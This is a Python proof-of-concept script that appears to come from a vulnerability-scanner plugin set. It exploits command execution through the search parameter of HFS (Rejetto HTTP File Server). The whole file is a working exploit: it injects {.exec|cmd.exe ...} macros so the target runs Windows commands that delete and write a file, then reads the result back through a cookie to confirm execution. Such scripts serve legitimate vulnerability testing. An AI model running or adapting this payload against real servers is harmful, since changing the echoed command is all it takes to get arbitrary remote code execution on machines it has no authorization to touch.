#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: hfs rejetto 远程代码执行
referer: https://www.seebug.org/vuldb/ssvid-87319
author: Lucifer
description: search引起的命令执行。
'''
import sys
import requests
import warnings
def run(url):
        result = ['hfs rejetto 远程代码执行', '', '']
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/?search==%00{.exec|cmd.exe /c del res.}{.exec|cmd.exe /c echo>res 123456test.}"
        vulnurl = url + payload
        try:
            sess = requests.Session()
            sess.get(vulnurl, headers=headers, timeout=10, verify=False)
            checkurl = url + "/?search==%00{.cookie|out|value={.load|res.}.}"
            req = sess.get(checkurl, headers=headers, timeout=10, verify=False)
            check_cookie = req.headers.get("set-cookie")
            if check_cookie is None:
                pass
            elif r"123456test" in check_cookie:
                result[2] = '存在'
                result[1]=vulnurl
            else:
                result[2] = '不存在'

        except:
            result[2] = '不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])

